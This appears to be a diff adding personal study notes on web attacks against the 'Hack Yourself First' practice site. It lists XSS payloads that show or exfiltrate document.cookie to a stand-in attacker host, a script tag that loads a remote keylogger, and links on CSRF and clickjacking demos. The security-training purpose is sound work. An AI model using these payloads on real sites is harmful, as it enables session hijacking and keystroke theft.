@@ -1,0 +1,38 @@
+
+xss
+Cookie - http
+http://hackyourselffirst.troyhunt.com/Search?searchTerm=');alert(document.cookie);//
+
+//Send http cookie to others
+http://hackyourselffirst.troyhunt.com/Search?searchTerm=');location.href='http://attacker.hackyourselffirst.troyhunt.com/?c='%2BencodeURIComponent(document.cookie);//
+
+
+$('#searchTerm').val('
+');location.href='http://attacker.hackyourselffirst.troyhunt.com?c='%2BencodeURIComponent(document.cookie);//
+');
+
+
+Server response header disclosure
+
+
+Apache vulernability
+https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-66/version_id-6098/Apache-Http-Server-1.3.23.html
+
+CVE - Common Vulernability exposure
+
+
+parameter tampering
+
+Content-Type:application/x-www-form-urlencoded
+<script>alert('naveen');</script>
+
+<script type="text/javascript" src="http://attacker.hackyourself.troyhunt.com/scripts/keyloggers.js"></script><script type="text/javascript">destination='http://attacker/hackyourself.troyhunt.com/Keylogger/?k='</script>
+
+CSRF
+http://evilcyberhacker.com/csrf.html
+
+click - jacking
+
+http://samy.pl/quickjack/fb.html
+
+http://samy.pl/quickjack/pwned.html
